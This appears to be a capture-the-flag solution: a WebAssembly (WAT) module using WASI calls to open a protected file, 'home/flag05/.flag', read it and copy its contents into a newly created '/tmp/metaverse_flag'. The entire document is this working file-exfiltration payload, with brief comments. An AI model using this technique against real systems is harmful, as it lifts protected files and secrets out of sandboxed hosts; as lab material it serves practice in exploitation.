(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit"
    (func $proc_exit (param i32)))
  (import "wasi_snapshot_preview1" "path_open"
    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1) ;; Allocate 1 memory page

  (data (i32.const 0) "home/flag05/.flag\00")
  (data (i32.const 50) "tmp/metaverse_flag\00")


  (func $_start (export "_start")
    ;; Open the flag file
	i32.const 3 ;; Fd of / directory
    i32.const 0
    i32.const 0 ;; Address of the path
    i32.const 17 ;; Path length
    i32.const 0
    i64.const 2 ;; Flags read permission
    i64.const 2 ;; Flag read permission
    i32.const 0
    i32.const 100 ;; Fd output address
    call $path_open
    drop

	;; Read the flag
	;; Output adress in input structure
    i32.const 200
    i32.const 500 ;; output addr
    i32.store

	;; Read length in input structure
    i32.const 204
    i32.const 50 ;; length
    i32.store

    i32.const 100 ;; Load the fd
    i32.load
    i32.const 200 ;; Input structure
    i32.const 1
    i32.const 300 ;; Output address
    call $fd_read
    drop

	;; Open output file
    i32.const 3 ;; Fd of /
    i32.const 0
    i32.const 50 ;; Addr of path
    i32.const 18 ;; Path length
    i32.const 1 ;; Create file flag
    i64.const 66 ;; Read and write permissions
    i64.const 66 ;; Read and write permissions
    i32.const 0
    i32.const 700 ;; Fd address
    call $path_open
    drop

	;; Write flag in the output file
	;; Input structure
    i32.const 600
    i32.const 500 ;; Input data addr
    i32.store

    i32.const 604
    i32.const 50 ;; Input data length 
    i32.store

    i32.const 700 ;; File fd
    i32.load
    i32.const 600 ;; Input struct
    i32.const 1
    i32.const 300
    call $fd_write
    drop

	;; Exit
    i32.const 0
    call $proc_exit
  )
)

